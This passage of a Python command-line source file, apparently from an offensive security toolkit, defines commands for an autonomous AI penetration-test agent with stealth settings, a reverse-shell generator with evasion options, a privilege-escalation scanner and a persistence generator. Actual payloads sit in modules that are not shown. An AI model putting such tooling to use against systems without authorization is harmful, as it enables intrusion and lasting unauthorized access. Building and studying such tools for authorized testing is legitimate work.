            console.print("   [cyan]https://github.com/settings/tokens[/cyan]")
            
            console.print("\n[white]2. Create .env file with YOUR REAL token:[/white]")
            console.print('   [cyan]echo "SCORPION_AI_API_KEY=ghp_YOUR_ACTUAL_TOKEN_HERE" >> .env[/cyan]')
            console.print("   [yellow]⚠️  Replace ghp_YOUR_ACTUAL_TOKEN_HERE with your real token![/yellow]")
            
            console.print("\n[white]3. Then use AI commands WITHOUT --api-key:[/white]")
            console.print("   [cyan]scorpion ai-pentest -t example.com[/cyan]")
            
            console.print("\n[cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/cyan]")
            console.print("[green bold]⚡ ALTERNATIVE: Set Environment Variable[/green bold]")
            console.print("[cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/cyan]\n")
            
            console.print("[white]Linux/Mac/Kali:[/white]")
            console.print("  [cyan]export SCORPION_AI_API_KEY='ghp_YOUR_ACTUAL_TOKEN_HERE'[/cyan]")
            console.print("  [yellow]⚠️  Use YOUR real token, not 'ghp_...'[/yellow]")
            
            console.print("\n[white]Windows PowerShell:[/white]")
            console.print("  [cyan]$env:SCORPION_AI_API_KEY='ghp_YOUR_ACTUAL_TOKEN_HERE'[/cyan]")
            console.print("  [yellow]⚠️  Use YOUR real token, not 'ghp_...'[/yellow]")
            
            console.print("\n[cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/cyan]")
            console.print("[green bold]🔑 Get FREE API Key[/green bold]")
            console.print("[cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/cyan]\n")
            
            console.print("[white]GitHub Models (FREE & Recommended):[/white]")
            console.print("  1. Visit: [cyan]https://github.com/marketplace/models[/cyan]")
            console.print("  2. Generate token: [cyan]https://github.com/settings/tokens[/cyan]")
            console.print("  3. Select scopes: [yellow]codespace, read:user, user:email[/yellow]")
            
            console.print("\n[dim]📚 Full guides: API_KEY_SETUP.md | GITHUB_MODELS_SETUP.md | AI_PENTEST_GUIDE.md[/dim]")
            raise typer.Exit(1)
    
    # Validate API key format - just basic checks, let provider validate
    api_key = api_key.strip()
    
    # Auto-detect AI provider from API key format if not specified
    if ai_provider == "openai":  # Default value; will be overridden by detection
        # GitHub tokens: ghp_ (classic), gho_ (OAuth), ghu_ (user-to-server), 
        # ghs_ (server-to-server), ghr_ (refresh), github_pat_ (fine-grained)
        if api_key.startswith(("ghp_", "gho_", "ghu_", "ghs_", "ghr_", "github_pat_")):
            ai_provider = "github"
            if model == "gpt-4":  # Still default
                model = "gpt-4o-mini"  # Better default for GitHub
            console.print("[cyan]✓ Auto-detected provider:[/cyan] GitHub Models (FREE)")
            console.print(f"[cyan]✓ Using model:[/cyan] {model}")
        elif api_key.startswith("sk-ant-"):
            ai_provider = "anthropic"
            if model == "gpt-4":
                model = "claude-3-sonnet-20240229"
            console.print("[cyan]✓ Auto-detected provider:[/cyan] Anthropic Claude")
            console.print(f"[cyan]✓ Using model:[/cyan] {model}")
        elif api_key.startswith("sk-proj-") or api_key.startswith("sk-"):
            # OpenAI keys can be sk-proj-xxx (newer) or sk-xxx (older)
            console.print("[cyan]✓ Using provider:[/cyan] OpenAI")
            console.print(f"[cyan]✓ Using model:[/cyan] {model}")
            # Validate OpenAI key format more carefully
            if not (api_key.startswith("sk-proj-") or (api_key.startswith("sk-") and len(api_key) > 40)):
                console.print("[yellow]⚠ Warning: OpenAI API key format may be invalid[/yellow]")
                console.print("[yellow]  Expected: sk-proj-... (50+ chars) or sk-... (40+ chars)[/yellow]")
                console.print(f"[yellow]  Your key: {api_key[:15]}... ({len(api_key)} chars)[/yellow]")
                console.print("[yellow]  Get valid key: https://platform.openai.com/api-keys[/yellow]")
        else:
            # If key format not recognized, try to infer based on which env provided it
            # Common patterns: GITHUB_TOKEN/GITHUB_PAT → github; OPENAI_API_KEY → openai; ANTHROPIC_API_KEY → anthropic
            source_hint = None
            if os.getenv("GITHUB_TOKEN") == api_key or os.getenv("GITHUB_PAT") == api_key:
                source_hint = "github"
            elif os.getenv("OPENAI_API_KEY") == api_key:
                source_hint = "openai"
            elif os.getenv("ANTHROPIC_API_KEY") == api_key:
                source_hint = "anthropic"
            if source_hint:
                ai_provider = source_hint
                console.print(f"[cyan]✓ Inferred provider from env var:[/cyan] {source_hint}")
            else:
                console.print("[yellow]⚠ Warning: Could not auto-detect provider from API key format[/yellow]")
                console.print(f"[yellow]  API key starts with: {api_key[:10]}...[/yellow]")
                console.print(f"[yellow]  Using default provider: {ai_provider}[/yellow]")
                console.print("[yellow]  If this fails, specify provider explicitly:[/yellow]")
                console.print("[yellow]    --ai-provider github  (for GitHub Models)[/yellow]")
                console.print("[yellow]    --ai-provider openai  (for OpenAI)[/yellow]")
    else:
        # Provider was explicitly specified
        console.print(f"[cyan]✓ Using provider:[/cyan] {ai_provider} (explicitly specified)")
        console.print(f"[cyan]✓ Using model:[/cyan] {model}")
    
    # Validate inputs
    try:
        primary_goal_enum = PrimaryGoal(primary_goal)
    except ValueError:
        console.print(f"[red]Invalid primary goal: {primary_goal}[/red]")
        console.print("[yellow]Valid options: comprehensive_assessment, privilege_escalation, data_access, network_mapping, web_exploitation[/yellow]")
        raise typer.Exit(1)
    
    try:
        stealth_enum = StealthLevel(stealth_level)
    except ValueError:
        console.print(f"[red]Invalid stealth level: {stealth_level}[/red]")
        console.print("[yellow]Valid options: low, moderate, high[/yellow]")
        raise typer.Exit(1)
    
    try:
        autonomy_enum = AutonomyLevel(autonomy)
    except ValueError:
        console.print(f"[red]Invalid autonomy level: {autonomy}[/red]")
        console.print("[yellow]Valid options: supervised, semi_autonomous, fully_autonomous[/yellow]")
        raise typer.Exit(1)
    
    try:
        risk_enum = RiskTolerance(risk_tolerance)
    except ValueError:
        console.print(f"[red]Invalid risk tolerance: {risk_tolerance}[/red]")
        console.print("[yellow]Valid options: low, medium, high[/yellow]")
        raise typer.Exit(1)
    
    # Parse secondary goals
    secondary_goals_list = [g.strip() for g in secondary_goals.split(",") if g.strip()]
    
    # Create configuration
    config = AIPentestConfig(
        target=target,
        primary_goal=primary_goal_enum,
        secondary_goals=secondary_goals_list,
        time_limit=time_limit,
        stealth_level=stealth_enum,
        autonomy_level=autonomy_enum,
        risk_tolerance=risk_enum,
        ai_provider=ai_provider,
        api_key=api_key,
        api_endpoint=api_endpoint,
        model=model,
        learning_mode=learning_mode,
        max_iterations=max_iterations,
        custom_instructions=custom_instructions
    )
    
    # Display configuration
    config_text = (
        f"[cyan]Target:[/cyan] {target}\n"
        f"[cyan]Primary Goal:[/cyan] {primary_goal}\n"
        f"[cyan]AI Provider:[/cyan] {ai_provider} ({model})\n"
        f"[cyan]Stealth Level:[/cyan] {stealth_level}\n"
        f"[cyan]Risk Tolerance:[/cyan] {risk_tolerance}\n"
        f"[cyan]Autonomy:[/cyan] {autonomy}\n"
        f"[cyan]Time Limit:[/cyan] {time_limit} minutes"
    )
    
    if custom_instructions:
        config_text += f"\n[yellow]Custom Instructions:[/yellow] {custom_instructions[:100]}{'...' if len(custom_instructions) > 100 else ''}"
    
    console.print(Panel.fit(
        config_text,
        title="🤖 AI Penetration Test Configuration",
        border_style="green"
    ))
    
    # Confirmation for high-risk configurations
    if risk_enum == RiskTolerance.HIGH or autonomy_enum == AutonomyLevel.FULLY_AUTONOMOUS:
        console.print("\n[red]⚠️  HIGH-RISK CONFIGURATION DETECTED[/red]")
        console.print("[yellow]This configuration may perform exploitation attempts.[/yellow]")
        console.print("[yellow]Ensure you have explicit written authorization.[/yellow]\n")
        
        confirm = typer.confirm("Do you have written authorization to test this target?")
        if not confirm:
            console.print("[red]Test cancelled. Obtain authorization before proceeding.[/red]")
            raise typer.Exit(1)
    
    try:
        # Create and execute AI agent
        agent = AIPentestAgent(config)
        report = asyncio.run(agent.execute())
        
        # Display summary
        console.print("\n" + "=" * 70)
        console.print("[green bold]AI Penetration Test Complete[/green bold]")
        console.print("=" * 70 + "\n")
        
        # Summary table
        summary_table = Table(title="Test Summary", box=box.ROUNDED, show_header=True)
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="green")
        
        summary_table.add_row("Target", report["summary"]["target"])
        summary_table.add_row("Duration", f"{report['summary']['duration_minutes']} minutes")
        summary_table.add_row("Iterations", str(report["summary"]["iterations"]))
        summary_table.add_row("Total Findings", str(report["summary"]["total_findings"]))
        summary_table.add_row("Actions Taken", str(report["summary"]["total_actions"]))
        
        console.print(summary_table)
        console.print()
        
        # Findings by severity
        findings_table = Table(title="Findings by Severity", box=box.ROUNDED)
        findings_table.add_column("Severity", style="cyan")
        findings_table.add_column("Count", style="green")
        
        for severity, count in report["findings_by_severity"].items():
            if count > 0:
                color = {
                    "critical": "red bold",
                    "high": "red",
                    "medium": "yellow",
                    "low": "blue",
                    "info": "white"
                }.get(severity, "white")
                findings_table.add_row(severity.upper(), str(count))
        
        console.print(findings_table)
        console.print()
        
        # Recommendations
        if report.get("recommendations"):
            console.print("[cyan bold]═══ Recommendations ═══[/cyan bold]\n")
            for rec in report["recommendations"]:
                console.print(f"  {rec}")
            console.print()
        
        # Save to file
        if output:
            with open(output, "w") as f:
                json.dump(report, f, indent=2)
            console.print(f"[green]✅ Full report saved to: {output}[/green]\n")
        else:
            # Save to default location
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            # Sanitize target for filename - replace invalid characters
            safe_target = target.replace('://', '_').replace('/', '_').replace(':', '_').replace('?', '_').replace('&', '_')
            default_output = f"ai_pentest_{safe_target}_{timestamp}.json"
            with open(default_output, "w") as f:
                json.dump(report, f, indent=2)
            console.print(f"[green]✅ Full report saved to: {default_output}[/green]\n")
        
        # Display top findings
        if report["detailed_findings"]:
            console.print("[cyan bold]═══ Top Findings ═══[/cyan bold]\n")
            
            # Sort by severity
            severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
            sorted_findings = sorted(
                report["detailed_findings"],
                key=lambda f: (severity_order.get(f["severity"], 5), f["timestamp"])
            )
            
            for finding in sorted_findings[:10]:  # Show top 10
                severity_color = {
                    "critical": "red bold",
                    "high": "red",
                    "medium": "yellow",
                    "low": "blue",
                    "info": "white"
                }.get(finding["severity"], "white")
                
                console.print(f"[{severity_color}]● {finding['severity'].upper()}[/{severity_color}] - {finding['description']}")
                console.print(f"  [dim]Tool: {finding['tool']} | Category: {finding['category']}[/dim]")
                console.print(f"  [dim]Action: {finding['recommended_action']}[/dim]\n")
        
        console.print("[green]✅ AI-powered penetration test completed successfully![/green]")
        console.print("[yellow]Review the detailed findings and take appropriate remediation actions.[/yellow]\n")
        
    except Exception as e:
        console.print(f"\n[red]Error during AI penetration test: {e}[/red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
        raise typer.Exit(1)


@app.command()
def threat_intel(
    indicator: str = typer.Argument(..., help="IP, domain, URL, or hash to check"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Check threat intelligence for an indicator (IP, domain, URL, or hash).
    Queries multiple sources: VirusTotal, AlienVault OTX, Shodan, AbuseIPDB, ThreatFox, URLhaus.
    """
    async def run():
        from .threat_intel import check_threat_intel
        
        console.print(f"\n[cyan]🔍 Checking threat intelligence for: {indicator}[/cyan]\n")
        
        try:
            result = await check_threat_intel(indicator)
            
            # Display results
            verdict_color = {"malicious": "red bold", "suspicious": "yellow", "clean": "green"}.get(result["verdict"], "white")
            console.print(f"[bold]Indicator:[/bold] {result['indicator']}")
            console.print(f"[bold]Type:[/bold] {result['indicator_type']}")
            console.print(f"[bold]Verdict:[/bold] [{verdict_color}]{result['verdict'].upper()}[/{verdict_color}]")
            console.print(f"[bold]Threat Score:[/bold] {result['overall_threat_score']}/100")
            console.print(f"[bold]Confidence:[/bold] {result['confidence']}")
            console.print(f"[bold]Sources Queried:[/bold] {result['sources_queried']}\n")
            
            if result.get("is_c2_server"):
                console.print("[red bold]⚠️  WARNING: Identified as C2 (Command & Control) server[/red bold]\n")
            
            if result.get("in_blocklist"):
                console.print("[red]⚠️  Found in threat blocklists[/red]\n")
            
            if result.get("malware_families"):
                console.print(f"[yellow]Malware Families:[/yellow] {', '.join(result['malware_families'])}\n")
            
            if result.get("categories"):
                console.print(f"[yellow]Categories:[/yellow] {', '.join(result['categories'])}\n")
            
            if result.get("associated_cves"):
                console.print(f"[red]Associated CVEs:[/red] {', '.join(result['associated_cves'][:5])}\n")
            
            # Save results
            if output:
                with open(output, "w") as f:
                    json.dump(result, f, indent=2)
                console.print(f"[green]✅ Report saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error querying threat intelligence: {e}[/red]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def threat_hunt(
    data_file: str = typer.Argument(..., help="Path to data file (logs, processes, network traffic)"),
    data_type: str = typer.Option("logs", "--type", "-t", help="Data type: logs, network_traffic, process_list, file_system"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Hunt for threats using behavioral analysis and IOC detection.
    Detects LOLBins, malware signatures, behavioral anomalies, and attack patterns.
    """
    async def run():
        from .threat_hunter import ThreatHunter
        
        console.print(f"\n[cyan]🔍 Threat Hunting: {data_file}[/cyan]\n")
        
        try:
            # Read data file
            with open(data_file, 'r') as f:
                if data_type == "logs":
                    data = f.readlines()
                else:
                    data = json.load(f)
            
            hunter = ThreatHunter()
            
            # Hunt for IOCs
            console.print("[yellow]Scanning for Indicators of Compromise (IOCs)...[/yellow]")
            iocs = await hunter.hunt_iocs({"type": data_type, "data": data})
            
            console.print(f"[green]✅ Found {len(iocs)} IOCs[/green]\n")
            
            # Display IOCs by severity
            critical_iocs = [ioc for ioc in iocs if ioc.severity == "critical"]
            high_iocs = [ioc for ioc in iocs if ioc.severity == "high"]
            
            if critical_iocs:
                console.print("[red bold]🚨 CRITICAL IOCs:[/red bold]")
                for ioc in critical_iocs[:5]:
                    console.print(f"  • {ioc.description}")
                    console.print(f"    [dim]Value: {ioc.value[:80]}[/dim]")
                    console.print(f"    [dim]Tags: {', '.join(ioc.tags)}[/dim]\n")
            
            if high_iocs:
                console.print("[red]⚠️  HIGH SEVERITY IOCs:[/red]")
                for ioc in high_iocs[:5]:
                    console.print(f"  • {ioc.description}")
                    console.print(f"    [dim]Value: {ioc.value[:80]}[/dim]\n")
            
            # Generate report
            report = await hunter.generate_threat_report(iocs, [], [])
            
            if output:
                with open(output, "w") as f:
                    json.dump(report, f, indent=2)
                console.print(f"[green]✅ Threat hunting report saved to: {output}[/green]")
            else:
                console.print(json.dumps(report, indent=2))
            
        except Exception as e:
            console.print(f"[red]Error during threat hunting: {e}[/red]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def attack_chain(
    findings_file: str = typer.Argument(..., help="JSON file with security findings"),
    mode: str = typer.Option("red_team", "--mode", "-m", help="Mode: red_team or blue_team"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Discover exploit chains from findings using AI decision engine.
    Automatically chains vulnerabilities for maximum impact (red team) or prioritizes fixes (blue team).
    
    NOTE: This command is disabled - ai_decision_engine module removed in Phase 1 optimization.
    Functionality now integrated into ai_pentest.py
    """
    async def run():
        # from .ai_decision_engine import AIDecisionEngine, Finding  # Removed in Phase 1 optimization
        console.print("[red]Error: This command is currently disabled.[/red]")
        console.print("[yellow]AI decision logic is now integrated into 'scorpion ai-pentest' command.[/yellow]")
        console.print("[cyan]Use: scorpion ai-pentest -t <target> -r high -g gain_shell_access[/cyan]")
        return
        
        console.print(f"\n[cyan]🧠 AI Decision Engine: {mode.upper()}[/cyan]\n")
        
        try:
            # Load findings
            with open(findings_file, 'r') as f:
                findings_data = json.load(f)
            
            engine = AIDecisionEngine(mode=mode)
            
            # Ingest findings
            console.print("[yellow]Ingesting findings...[/yellow]")
            for finding_data in findings_data:
                finding = Finding(
                    finding_id=finding_data.get("id", "unknown"),
                    finding_type=finding_data.get("type", "unknown"),
                    severity=finding_data.get("severity", "medium"),
                    confidence=finding_data.get("confidence", 80),
                    target=finding_data.get("target", "unknown"),
                    details=finding_data.get("details", {}),
                    mitre_techniques=finding_data.get("mitre_techniques", [])
                )
                engine.ingest_finding(finding)
            
            console.print(f"[green]✅ Ingested {len(findings_data)} findings[/green]\n")
            
            # Analyze
            console.print("[yellow]Analyzing attack chains and generating recommendations...[/yellow]")
            analysis = engine.analyze_findings()
            
            # Display results
            console.print(f"\n[bold]Overall Risk Score:[/bold] {analysis['overall_risk_score']}/100\n")
            
            if analysis.get("exploit_chains"):
                console.print("[red bold]🔗 DISCOVERED EXPLOIT CHAINS:[/red bold]\n")
                for chain in analysis["exploit_chains"]:
                    console.print(f"[bold]{chain['name']}[/bold]")
                    console.print(f"  [dim]{chain['description']}[/dim]")
                    console.print(f"  [yellow]Impact:[/yellow] {chain['total_impact']}/100")
                    console.print(f"  [yellow]Success Probability:[/yellow] {chain['success_probability']}%")
                    console.print(f"  [dim]MITRE: {', '.join(chain['mitre_techniques'])}[/dim]\n")
                    
                    for step in chain['steps']:
                        console.print(f"    {step['step']}. {step['action']}")
                    console.print()
            
            if analysis.get("recommended_next_actions"):
                console.print("[green bold]📋 RECOMMENDED ACTIONS:[/green bold]\n")
                for action in analysis["recommended_next_actions"][:5]:
                    priority_color = "red" if action["priority"] >= 8 else "yellow" if action["priority"] >= 5 else "blue"
                    console.print(f"[{priority_color}]Priority {action['priority']}:[/{priority_color}] {action['description']}")
                    console.print(f"  [dim]{action['rationale']}[/dim]\n")
            
            # Save results
            if output:
                with open(output, "w") as f:
                    json.dump(analysis, f, indent=2, default=str)
                console.print(f"[green]✅ Analysis saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error analyzing attack chains: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def purple_team(
    target: str = typer.Argument(..., help="Target host or URL"),
    profile: str = typer.Option("web", "--profile", "-p", help="Attack profile: web, network, or full"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Run purple team simulation: Red team attacks + Blue team detection.
    Identifies detection gaps and provides defensive recommendations.
    """
    async def run():
        from .purple_team import PurpleTeamSimulator
        
        try:
            simulator = PurpleTeamSimulator(target)
            report = await simulator.run_full_simulation(attack_profile=profile)
            
            # Save results
            if output:
                output_file = output
            else:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = f"purple_team_{target.replace('.', '_').replace(':', '_')}_{timestamp}.json"
            
            with open(output_file, "w") as f:
                json.dump(report, f, indent=2, default=str)
            
            console.print(f"\n[green]✅ Purple team report saved to: {output_file}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error during purple team simulation: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def mitre_map(
    findings_file: str = typer.Argument(..., help="JSON file with security findings"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Map security findings to MITRE ATT&CK framework.
    Generates attack matrix with tactics, techniques, and mitigation recommendations.
    """
    from .mitre_attack import MITREAttackMapper
    
    console.print(f"\n[cyan]🎯 MITRE ATT&CK Mapping[/cyan]\n")
    
    try:
        # Load findings
        with open(findings_file, 'r') as f:
            findings = json.load(f)
        
        mapper = MITREAttackMapper()
        
        # Generate matrix
        console.print("[yellow]Mapping findings to MITRE ATT&CK framework...[/yellow]")
        matrix = mapper.generate_attack_matrix(findings)
        
        console.print(f"[green]✅ Mapped {matrix['total_findings']} findings to {matrix['total_techniques']} techniques[/green]\n")
        
        # Display tactics covered
        console.print("[bold]Tactics Covered:[/bold]")
        for tactic, count in matrix["tactic_breakdown"].items():
            console.print(f"  • {tactic}: {count} findings")
        console.print()
        
        # Display top techniques
        if matrix.get("top_techniques"):
            console.print("[bold]Top Techniques Detected:[/bold]")
            for tech in matrix["top_techniques"][:10]:
                console.print(f"  • {tech['technique_id']} - {tech['technique_name']}")
                console.print(f"    [dim]Tactic: {tech['tactic']} | Count: {tech['count']}[/dim]")
                console.print(f"    [dim]Findings: {', '.join(tech['findings'][:3])}[/dim]\n")
        
        # Display kill chain
        if matrix.get("kill_chain_phases"):
            console.print("[bold cyan]Kill Chain Progression:[/bold cyan]")
            for phase in matrix["kill_chain_phases"]:
                console.print(f"  → {phase['phase']}: {phase['count']} findings")
        console.print()
        
        # Generate defense recommendations
        console.print("[yellow]Generating defense recommendations...[/yellow]")
        defenses = mapper.suggest_defenses(findings)
        
        if defenses.get("immediate_actions"):
            console.print("\n[red bold]🚨 IMMEDIATE ACTIONS:[/red bold]")
            for action in defenses["immediate_actions"]:
                console.print(f"  • {action}")
        
        if defenses.get("short_term_improvements"):
            console.print("\n[yellow bold]⏰ SHORT-TERM IMPROVEMENTS:[/yellow bold]")
            for action in defenses["short_term_improvements"]:
                console.print(f"  • {action}")
        
        if defenses.get("long_term_strategic"):
            console.print("\n[blue bold]📅 LONG-TERM STRATEGIC:[/blue bold]")
            for action in defenses["long_term_strategic"]:
                console.print(f"  • {action}")
        
        console.print()
        
        # Save results
        result = {
            "matrix": matrix,
            "defenses": defenses,
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        if output:
            with open(output, "w") as f:
                json.dump(result, f, indent=2, default=str)
            console.print(f"[green]✅ MITRE ATT&CK mapping saved to: {output}[/green]")
        
    except Exception as e:
        console.print(f"[red]Error mapping to MITRE ATT&CK: {e}[/red]")
        raise typer.Exit(1)


@app.command()
def advanced_shell(
    lhost: str = typer.Argument(..., help="Attacker IP address (LHOST)"),
    lport: int = typer.Option(4444, "--port", "-p", help="Listener port (LPORT)"),
    protocol: str = typer.Option("bash_tcp", "--protocol", "-P", help="Shell protocol: bash_tcp, python_tcp, powershell_tcp, dns_tunnel, icmp_shell, websocket, smb_pipe, http2, ssl_encrypted, socat_encrypted"),
    platform: str = typer.Option("linux", "--platform", "-os", help="Target platform: windows, linux, macos"),
    encoding: str = typer.Option("none", "--encoding", "-e", help="Payload encoding: none, base64, hex, xor, gzip_base64"),
    all_shells: bool = typer.Option(False, "--all", "-a", help="Generate all available shells for platform"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Generate advanced multi-protocol reverse shells.
    Supports DNS tunneling, ICMP shells, WebSocket, SMB pipes, HTTP/2, SSL encrypted shells.
    """
    async def run():
        from .advanced_shells import AdvancedShellGenerator, ShellProtocol, ShellEncoding
        
        try:
            console.print(f"\n[cyan]🐚 Advanced Shell Generator[/cyan]\n")
            console.print(f"[dim]LHOST: {lhost} | LPORT: {lport} | Platform: {platform}[/dim]\n")
            
            generator = AdvancedShellGenerator(lhost=lhost, lport=lport)
            
            if all_shells:
                # Generate all shells for platform
                shells = await generator.generate_all_shells(platform=platform, encoding=ShellEncoding(encoding))
                
                console.print(f"[green]✅ Generated {len(shells)} shells for {platform}:[/green]\n")
                
                for shell in shells:
                    console.print(Panel.fit(
                        f"[bold cyan]{shell.protocol.value}[/bold cyan]\n\n"
                        f"[yellow]Description:[/yellow] {shell.description}\n\n"
                        f"[yellow]Payload:[/yellow]\n[white]{shell.payload}[/white]\n\n"
                        f"[yellow]Listener:[/yellow]\n[white]{shell.listener_command}[/white]\n\n"
                        f"[dim]Evasion: {', '.join(shell.evasion_features)}[/dim]",
                        title=f"[bold]{shell.protocol.value.upper()}[/bold]",
                        border_style="cyan"
                    ))
                
                # Save to file
                if output:
                    with open(output, "w") as f:
                        json.dump([s.to_dict() for s in shells], f, indent=2)
                    console.print(f"\n[green]✅ Shells saved to: {output}[/green]")
                
            else:
                # Generate single shell
                shell = await generator.generate_shell(
                    protocol=ShellProtocol(protocol),
                    platform=platform,
                    encoding=ShellEncoding(encoding),
                    evasion=True
                )
                
                console.print(Panel.fit(
                    f"[bold cyan]{shell.protocol.value}[/bold cyan]\n\n"
                    f"[yellow]Description:[/yellow] {shell.description}\n\n"
                    f"[yellow]Payload:[/yellow]\n[white]{shell.payload}[/white]\n\n"
                    f"[yellow]Listener Command:[/yellow]\n[white]{shell.listener_command}[/white]\n\n"
                    f"[yellow]Evasion Features:[/yellow] {', '.join(shell.evasion_features)}\n"
                    f"[yellow]Port:[/yellow] {shell.port}",
                    title=f"[bold]{protocol.upper()} Shell[/bold]",
                    border_style="cyan"
                ))
                
                # Show TTY upgrade commands
                if platform == "linux":
                    tty_commands = generator.get_tty_upgrade_commands("linux")
                    console.print("\n[yellow]📟 TTY Upgrade Commands:[/yellow]")
                    for method, cmd in list(tty_commands.items())[:3]:
                        console.print(f"  [cyan]{method}:[/cyan] {cmd}")
                
                if output:
                    with open(output, "w") as f:
                        json.dump(shell.to_dict(), f, indent=2)
                    console.print(f"\n[green]✅ Shell saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error generating shell: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def privesc(
    platform: str = typer.Option("linux", "--platform", "-p", help="Target platform: windows, linux"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Scan for privilege escalation opportunities.
    Detects kernel exploits, SUID binaries, sudo misconfigurations, and Windows token issues.
    """
    async def run():
        from .privilege_escalation import PrivilegeEscalationScanner
        
        try:
            console.print(f"\n[cyan]⬆️ Privilege Escalation Scanner[/cyan]\n")
            console.print(f"[dim]Platform: {platform}[/dim]\n")
            
            scanner = PrivilegeEscalationScanner()
            
            if platform == "linux":
                vectors = await scanner.scan_linux()
            elif platform == "windows":
                vectors = await scanner.scan_windows()
            else:
                console.print(f"[red]Unsupported platform: {platform}[/red]")
                raise typer.Exit(1)
            
            report = await scanner.generate_report(vectors)
            
            # Display summary
            console.print(Panel.fit(
                f"[bold green]Found {report['total_vectors']} escalation vectors[/bold green]\n\n"
                f"[red]Critical:[/red] {report['severity_breakdown']['critical']}\n"
                f"[yellow]High:[/yellow] {report['severity_breakdown']['high']}\n"
                f"[cyan]Medium:[/cyan] {report['severity_breakdown']['medium']}\n"
                f"[dim]Low:[/dim] {report['severity_breakdown']['low']}",
                title="[bold]Privilege Escalation Summary[/bold]",
                border_style="green"
            ))
            
            # Display top recommendations
            console.print("\n[bold yellow]🎯 Top 5 Escalation Vectors:[/bold yellow]\n")
            for i, vec in enumerate(report['top_recommendations'][:5], 1):
                console.print(Panel.fit(
                    f"[yellow]Target:[/yellow] {vec['target']}\n"
                    f"[yellow]Technique:[/yellow] {vec['technique']}\n"
                    f"[yellow]Description:[/yellow] {vec['description']}\n\n"
                    f"[yellow]Exploitation:[/yellow]\n[white]{vec['exploitation_command']}[/white]\n\n"
                    f"[yellow]Success Probability:[/yellow] {vec['success_probability']}%",
                    title=f"[bold]{i}. {vec['severity'].upper()}[/bold]",
                    border_style="red" if vec['severity'] == "critical" else "yellow"
                ))
            
            # Save report
            if output:
                with open(output, "w") as f:
                    json.dump(report, f, indent=2)
                console.print(f"\n[green]✅ Report saved to: {output}[/green]")
            
        except Exception as e:
            console.print(f"[red]Error scanning for privilege escalation: {e}[/red]")
            import traceback
            console.print(f"[dim]{traceback.format_exc()}[/dim]")
            raise typer.Exit(1)
    
    asyncio.run(run())


@app.command()
def persist(
    payload: str = typer.Argument(..., help="Payload command to persist"),
    platform: str = typer.Option("windows", "--platform", "-p", help="Target platform: windows, linux"),
    technique: str = typer.Option("registry_run", "--technique", "-t", help="Persistence technique"),
    stealth: bool = typer.Option(True, "--stealth", "-s", help="Use stealthy techniques"),
    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all persistence techniques"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
):
    """
    Generate persistence mechanisms for maintaining access.
    Windows: Registry, scheduled tasks, services, WMI events.
    Linux: Cron jobs, systemd services, SSH keys, bashrc.
    """
    async def run():
        from .persistence import PersistenceManager, PersistenceTechnique
        
        try:
            console.print(f"\n[cyan]🔒 Persistence Mechanism Generator[/cyan]\n")
            console.print(f"[dim]Platform: {platform} | Stealth: {stealth}[/dim]\n")
            
            manager = PersistenceManager(payload=payload)
            
            if all_techniques:
                # Generate all persistence mechanisms
                mechanisms = await manager.generate_all_mechanisms(os_type=platform, stealth=stealth)
                
                console.print(f"[green]✅ Generated {len(mechanisms)} persistence mechanisms:[/green]\n")
                
                for mech in mechanisms:
                    console.print(Panel.fit(
                        f"[bold cyan]{mech.technique.value}[/bold cyan]\n\n"
                        f"[yellow]Description:[/yellow] {mech.description}\n\n"
                        f"[yellow]Trigger:[/yellow] {mech.trigger}\n"
                        f"[yellow]Stealth Level:[/yellow] {mech.stealth_level}\n"
                        f"[yellow]Requires Admin:[/yellow] {mech.requires_admin}\n"
                        f"[yellow]MITRE:[/yellow] {mech.mitre_technique}\n\n"
                        f"[yellow]Installation:[/yellow]\n[white]{mech.persistence_command}[/white]\n\n"
                        f"[yellow]Removal:[/yellow]\n[white]{mech.removal_command}[/white]",
                        title=f"[bold]{mech.technique.value.upper()}[/bold]",
                        border_style="green"
                    ))
                
                if output:
                    with open(output, "w") as f:
                        json.dump([m.to_dict() for m in mechanisms], f, indent=2)
                    console.print(f"\n[green]✅ Mechanisms saved to: {output}[/green]")
            
            else:
                # Generate single persistence mechanism
                if platform == "windows":
                    mechanism = await manager.generate_windows_persistence(
                        technique=PersistenceTechnique(technique),
                        stealth=stealth
                    )
                else:
                    mechanism = await manager.generate_linux_persistence(
